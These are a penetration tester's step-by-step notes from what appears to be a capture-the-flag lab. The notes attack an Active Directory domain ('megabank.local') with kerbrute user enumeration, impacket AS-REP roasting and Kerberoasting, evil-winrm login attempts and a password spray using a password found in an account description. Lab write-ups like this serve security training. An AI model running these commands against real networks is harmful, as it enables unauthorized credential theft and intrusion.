- enum4linux in tcp139 folder gave a list of usernames
```
cat scans/tcp_139/enum4linux.txt | grep usernames 
```
- Enter the usernames into usernames.txt and check with kerbrute for valid usernames 
```
kerbrute userenum --dc 10.10.10.169 -d megabank.local usernames.txt > userenum.txt
```
- Get more readable data like USERNAME@DOMAIN with
```
awk '{print $7}' userenum.txt > valid_usernames.txt
```
- Get it down to single names without @DOMAIN with 
```
cut -d '@' -f 1 > actual_usernames.txt
```
- Check for asreproast with impacket-getnpusers
```
impacket-GetNPUsers -dc-ip 10.10.10.169 megabank.local/ -usersfile actual_users.txt -format hashcat -outputfile hashes_domain.txt
```
- No luck output below
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] [Errno Connection error (10.10.10.169:88)] [Errno 110] Connection timed out
[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sunita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annika doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set
```
- Found Marko's password
```
|   MEGABANK\marko (RID: 1111)
|     Full name:   Marko Novak
|     Description: Account created. Password set to Welcome123!
|     Flags:       Normal user account, Password does not expire
```
- tried a kerberoast no luck
```
impacket-GetUserSPNs -dc-ip 10.10.10.169 megabank.local/marko:Welcome123! -request
```
- tried evil-winrm no luck
```
evil-winrm -u marko -p Welcome123! -i 10.10.10.169
```
- Trying a password spray with Marko's password to see if it's reused
```
/opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray --dc 10.10.10.169 -d megabank.local ../../actual_users.txt 'Welcome123!'
```
- No luck
- 